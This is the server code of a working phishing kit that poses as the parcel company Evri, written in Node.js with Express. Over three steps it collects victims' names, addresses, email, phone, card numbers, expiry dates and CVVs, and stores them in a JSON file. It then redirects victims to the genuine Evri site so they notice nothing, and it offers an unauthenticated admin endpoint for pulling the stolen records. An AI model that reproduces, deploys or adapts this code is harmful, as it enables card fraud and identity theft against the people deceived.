const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');
const app = express();
const dataFile = 'data.json';

app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));

function loadData() {
  if (!fs.existsSync(dataFile)) return [];
  return JSON.parse(fs.readFileSync(dataFile));
}
function saveData(data) {
  fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
}

// Step 1
app.post('/details', (req, res) => {
  let data = loadData();
  let entry = {
    firstName: req.body.firstName,
    lastName: req.body.lastName,
    addr1: req.body.addr1,
    addr2: req.body.addr2,
    postcode: req.body.postcode,
    email: req.body.email,
    phone: req.body.phone
  };
  data.push(entry);
  saveData(data);
  res.redirect('/selectdate.html');
});

// Step 2
app.post('/delivery-date', (req, res) => {
  let data = loadData();
  data[data.length - 1].deliveryDate = req.body.deliveryDate;
  saveData(data);
  res.redirect('/payment.html');
});

// Step 3: Redirect to real Evri
app.post('/payment', (req, res) => {
  let data = loadData();
  data[data.length - 1].cardnum = req.body.cardnum;
  data[data.length - 1].exp = req.body.exp;
  data[data.length - 1].cvv = req.body.cvv;
  data[data.length - 1].submitted = new Date().toISOString();
  saveData(data);
  res.redirect('https://www.evri.com/');
});

// Admin
app.get('/admin-data', (req, res) => {
  let data = loadData();
  let cutoff = Date.now() - 30*24*60*60*1000;
  let recent = data.filter(d => new Date(d.submitted).getTime() > cutoff);
  res.json(recent);
});

app.listen(3000, () => console.log('Server running at http://localhost:3000'));
